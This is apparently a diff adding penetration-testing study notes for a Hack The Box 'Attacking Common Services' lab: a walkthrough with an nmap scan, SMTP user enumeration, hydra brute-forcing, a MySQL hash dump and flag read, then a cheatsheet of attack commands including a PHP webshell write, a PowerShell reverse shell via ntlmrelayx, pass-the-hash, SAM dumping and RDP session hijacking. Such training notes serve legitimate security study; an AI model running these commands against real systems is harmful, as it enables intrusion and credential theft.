@@ -1927,3 +1927,206 @@ When a user or a system tries to perform a Name Resolution (NR), a series of pro
 - If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
 - Is there no local DNS record? A query will be sent to the DNS server that has been configured.
 - If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.
+
+### Attacking Common Services - Easy
+Host: 10.129.45.215
+
+```sh
+┌─[us-academy-2]─[10.10.14.187]─[htb-ac-713396@htb-ckpvnzbf3p]─[~]
+└──╼ [★]$ sudo nmap -A -T5 10.129.203.7
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-23 15:27 GMT
+Nmap scan report for 10.129.203.7
+Host is up (0.0050s latency).
+Not shown: 993 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+|     Command unknown, not supported or not allowed...
+|     Command unknown, not supported or not allowed...
+|   NULL: 
+|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+25/tcp   open  smtp          hMailServer smtpd
+| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
+|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
+| http-title: Welcome to XAMPP
+|_Requested resource was http://10.129.203.7/dashboard/
+443/tcp  open  https?
+| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
+| Not valid before: 2022-04-21T19:27:17
+|_Not valid after:  2032-04-18T19:27:17
+587/tcp  open  smtp          hMailServer smtpd
+| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.4.24-MariaDB
+|   Thread ID: 11
+|   Capabilities flags: 63486
+|   Some Capabilities: DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, LongColumnFlag, FoundRows, InteractiveClient, SupportsCompression, Speaks41ProtocolNew, IgnoreSigpipes, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|_  Auth Plugin Name: mysql_native_password
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WIN-EASY
+|   NetBIOS_Domain_Name: WIN-EASY
+|   NetBIOS_Computer_Name: WIN-EASY
+|   DNS_Domain_Name: WIN-EASY
+|   DNS_Computer_Name: WIN-EASY
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-02-23T15:28:23+00:00
+|_ssl-date: 2024-02-23T15:28:31+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=WIN-EASY
+| Not valid before: 2024-02-22T15:27:20
+|_Not valid after:  2024-08-23T15:27:20
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Timing level 5 (Insane) used
+No OS matches for host
+Network Distance: 2 hops
+Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 25/tcp)
+HOP RTT     ADDRESS
+1   7.99 ms 10.10.14.1
+2   7.29 ms 10.129.203.7
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.96 seconds
+
+┌─[us-academy-2]─[10.10.14.187]─[htb-ac-713396@htb-ckpvnzbf3p]─[~]
+└──╼ [★]$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.220.215
+fiona@inlanefreight.htb
+
+┌─[us-academy-2]─[10.10.14.187]─[htb-ac-713396@htb-ckpvnzbf3p]─[~]
+└──╼ [★]$ hydra -l "fiona@inlanefreight.htb" -P /usr/share/wordlists/rockyou.txt smtp://10.129.220.215 -f -t64
+[25][smtp] host: 10.129.45.212   login: fiona@inlanefreight.htb   password: 987654321
+
+┌─[us-academy-2]─[10.10.14.187]─[htb-ac-713396@htb-ckpvnzbf3p]─[~]
+└──╼ [★]$ mysql -u fiona -p987654321 -h 10.129.220.215
+MariaDB [mysql]> select user,password from user;
++-------+-------------------------------------------+
+| User  | Password                                  |
++-------+-------------------------------------------+
+| root  |                                           |
+| fiona | *DABCF719388B72AD432DE5E88423B56D652DD8B0 |
+| root  |                                           |
+| root  |                                           |
+| pma   |                                           |
++-------+-------------------------------------------+
+5 rows in set (0.004 sec)
+
+MariaDB [mysql]> select LOAD_FILE('c://users/administrator/desktop/flag.txt');
++-------------------------------------------------------+
+| LOAD_FILE('c://users/administrator/desktop/flag.txt') |
++-------------------------------------------------------+
+| HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}               |
++-------------------------------------------------------+
+1 row in set (0.087 sec)
+```
+
+**flag:** `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`
+
+### Attacking Common Services - Medium
+
+**flag:** ``
+
+### Attacking Common Services - Hard
+
+**flag:** ``
+
+### Cheatsheet
+**Attacking FTP**
+
+| Command                                            | Description                                                        |
+|----------------------------------------------------|--------------------------------------------------------------------|
+| `ftp 192.168.2.142`                                | Connecting to the FTP server using the ftp client.                 |
+| `nc -v 192.168.2.142 21`                           | Connecting to the FTP server using netcat.                         |
+| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` | Brute-forcing the FTP service.                                     |
+
+**Attacking SMB**
+
+| Command                                                       | Description                                                                 |
+|---------------------------------------------------------------|-----------------------------------------------------------------------------|
+| `smbclient -N -L //10.129.14.128`                             | Null-session testing against the SMB service.                               |
+| `smbmap -H 10.129.14.128`                                     | Network share enumeration using smbmap.                                     |
+| `smbmap -H 10.129.14.128 -r notes`                            | Recursive network share enumeration using smbmap.                           |
+| `smbmap -H 10.129.14.128 --download "notes\note.txt"`         | Download a specific file from the shared folder.                            |
+| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`  | Upload a specific file to the shared folder.                                |
+| `rpcclient -U'%' 10.10.110.17`                                | Null-session with the rpcclient.                                            |
+| `./enum4linux-ng.py 10.10.11.45 -A -C`                        | Automated enumeration of the SMB service using enum4linux-ng.               |
+| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Password spraying against different users from a list.                  |
+| `impacket-psexec administrator:'Password123!'@10.10.110.17`   | Connect to the SMB service using the impacket-psexec.                       |
+| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Execute a command over the SMB service using crackmapexec.         |
+| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` | Enumerating Logged-on users.                                          |
+| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` | Extract hashes from the SAM database.                                      |
+| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Use the Pass-The-Hash technique to authenticate on the target host. |
+| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` | Dump the SAM database using impacket-ntlmrelayx.                           |
+| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using impacket-ntlmrelayx. |
+
+**Attacking SQL Databases**
+
+| Command                                                      | Description                                                                           |
+|--------------------------------------------------------------|---------------------------------------------------------------------------------------|
+| `mysql -u julio -pPassword123 -h 10.129.20.13`               | Connecting to the MySQL server.                                                       |
+| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30` | Connecting to the MSSQL server.                                               |
+| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`          | Connecting to the MSSQL server from Linux.                                            |
+| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`       | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. |
+| `mysql> SHOW DATABASES;`                                     | Show all available databases in MySQL.                                                 |
+| `mysql> USE htbusers;`                                       | Select a specific database in MySQL.                                                  |
+| `mysql> SHOW TABLES;`                                        | Show all available tables in the selected database in MySQL.                          |
+| `mysql> SELECT * FROM users;`                                | Select all available entries from the "users" table in MySQL.                         |
+| `sqlcmd> SELECT name FROM master.dbo.sysdatabases`           | Show all available databases in MSSQL.                                                 |
+| `sqlcmd> USE htbusers`                                       | Select a specific database in MSSQL.                                                   |
+| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`   | Show all available tables in the selected database in MSSQL.                          |
+| `sqlcmd> SELECT * FROM users`                                | Select all available entries from the "users" table in MSSQL.                         |
+| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1`    | To allow advanced options to be changed.                                               |
+| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`              | To enable the xp_cmdshell.                                                             |
+| `sqlcmd> RECONFIGURE`                                        | To be used after each sp_configure command to apply the changes.                       |
+| `sqlcmd> xp_cmdshell 'whoami'`                               | Execute a system command from MSSQL server.                                            |
+| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL.                           |
+| `mysql> show variables like "secure_file_priv";`             | Check if the secure file privileges are empty to read locally stored files on the system. |
+| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Read local files in MSSQL. |
+| `mysql> select LOAD_FILE("/etc/passwd");`                    | Read local files in MySQL.                                                             |
+| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`    | Hash stealing using the xp_dirtree command in MSSQL.                                   |
+| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`    | Hash stealing using the xp_subdirs command in MSSQL.                                   |
+| `sqlcmd> SELECT srvname, isremote FROM sysservers`           | Identify linked servers in MSSQL.                                                      |
+| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identify the user and its privileges used for the remote connection in MSSQL. |
+
+**Attacking RDP**
+
+| Command                                                | Description                                                                 |
+|--------------------------------------------------------|-----------------------------------------------------------------------------|
+| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'` | Password spraying against the RDP service.                                  |
+| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp` | Brute-forcing the RDP service.                                              |
+| `rdesktop -u admin -p password123 192.168.2.143`       | Connect to the RDP service using rdesktop in Linux.                         |
+| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` | Impersonate a user without its password.                                    |
+| `net start sessionhijack`                              | Execute the RDP session hijack.                                             |
+| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable "Restricted Admin Mode" on the target Windows host.          |
+| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA` | Use the Pass-The-Hash technique to login on the target host without a password. |
+
+**Attacking DNS**
+
+| Command                                          | Description                                                             |
+|--------------------------------------------------|-------------------------------------------------------------------------|
+| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` | Perform an AXFR zone transfer attempt against a specific name server.   |
+| `subfinder -d inlanefreight.com -v`              | Brute-forcing subdomains.                                               |
+| `host support.inlanefreight.com`                 | DNS lookup for the specified subdomain.                                 |
+
+
+**Attacking Email Services**
+
+| Command | Description |
+| ------- | ----------- |
+| `host -t MX microsoft.com` | DNS lookup for mail servers for the specified domain. |
+| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"` | DNS lookup for mail servers for the specified domain. |
+| `host -t A mail1.inlanefreight.htb.` | DNS lookup of the IPv4 address for the specified subdomain. |
+| `telnet 10.10.110.20 25` | Connect to the SMTP server. |
+| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7` | SMTP user enumeration using the RCPT command against the specified host. |
+| `python3 o365spray.py --validate --domain msplaintext.xyz` | Verify the usage of Office365 for the specified domain. |
+| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz` | Enumerate existing users using Office365 on the specified domain. |
+| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` | Password spraying against a list of users that use Office365 for the specified domain. |
+| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3` | Brute-forcing the POP3 service. |
+| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Testing the SMTP service for the open-relay vulnerability. |
